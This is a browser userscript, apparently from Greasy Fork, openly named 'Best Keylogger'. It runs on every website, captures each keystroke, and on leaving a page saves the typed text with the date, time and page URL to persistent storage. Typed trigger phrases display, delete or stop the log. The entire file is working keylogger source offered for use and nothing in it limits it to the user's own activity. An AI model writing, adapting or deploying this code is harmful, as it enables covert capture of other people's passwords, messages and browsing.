// ==UserScript==
// @name         Best Keylogger
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  The best free keylogger!
// @copyright    2016
// @author       Arden Xie
// @include      http*://*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_deleteValue
// @noframes
// @downloadURL https://update.greasyfork.org/scripts/24601/Best%20Keylogger.user.js
// @updateURL https://update.greasyfork.org/scripts/24601/Best%20Keylogger.meta.js
// ==/UserScript==

(function() {
	'use strict';

	window.addEventListener('keydown', capture);
	window.addEventListener('keyup', up);
	window.addEventListener("beforeunload", save);

	var chars = "";
	var keylogging = true;
	var down = false;

	function capture(evt) {
		if (keylogging && !down) {
			down = true;
			chars += String.fromCharCode(evt.keyCode).toLowerCase();

			if (chars != chars.replace("stop keylog", "something different")) {
				keylogging = false;
                                console.log("keylog stopped");
			} else if (chars != chars.replace("output keylog", "something different")) {
				chars = chars.replace("output keylog", "");
				alert(GM_getValue("typed", "none"));
			} else if (chars != chars.replace("delete keylog", "something different")) {
				console.log("deleting... ");
				GM_deleteValue("typed");
				if (GM_getValue("typed", ".")!=".") {
					console.error("Could not delete keylog");
				} else {
					console.log("Successful");
				}
				chars = "";
			}
		}
	}

	function up() {
		down = false;
	}

	function save(evt) {
		var now = new Date();
		GM_setValue("typed", GM_getValue("typed", "")+" [ "+now.getMonth()+", "+now.getDate()+", "+now.getHours()+":"+now.getMinutes()+", "+window.location.href+" ]: "+chars+"\n");
	}
})();